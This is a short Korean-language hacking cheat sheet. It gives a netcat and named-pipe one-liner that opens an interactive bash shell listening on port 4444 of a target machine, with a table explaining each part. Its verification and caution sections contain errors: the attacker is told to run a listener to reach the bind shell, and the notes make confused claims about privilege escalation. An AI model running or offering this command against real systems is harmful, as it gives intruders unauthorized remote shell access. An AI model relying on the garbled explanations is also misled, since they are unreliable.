# bind shell

## 개요

리버스 쉘을 받는 쪽이 아니라, 대상 쪽에서 4444 포트로 셸을 기다리는 방식이다. 방화벽이 리스너에 닿지 않는 한 작동한다.

## 명령

```bash
# 리스너: 공격자가 연결할 셸을 띄운다
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f
```

## 각 명령의 의미

| 명령 | 의미 |
|------|------|
| `rm -f /tmp/f` | 기존 파이프 파일을 정리한다 |
| `mkfifo /tmp/f` | named pipe(FIFO)를 만든다 |
| `cat /tmp/f` | 파이프 입력을 기다린다 |
| `\| bash -i` | 입력을 받아 대상 셸을 실행한다 |
| `\| nc -l 0.0.0.0 4444` | 원격 접속을 기다린다 |
| `>/tmp/f` | nc 접속 시 쓸 임시 파일 |

## 확인

- `nc -lvnp 4444`로 공격자가 접속할 때 대상의 `bash -i`가 떠오른다.
- 대상에 셸이 뜨지 않으면, 방화벽/실행 권한/파이프 경로를 다시 확인한다.

## 주의

- bind shell은 대상 권한으로 실행되므로, 권한 상승 전 단계로 쓸 수 없다.
- 리버스 쉘(reverse shell)을 먼저 얻은 뒤 bind shell로 전환하는 흐름이 더 안전하다.
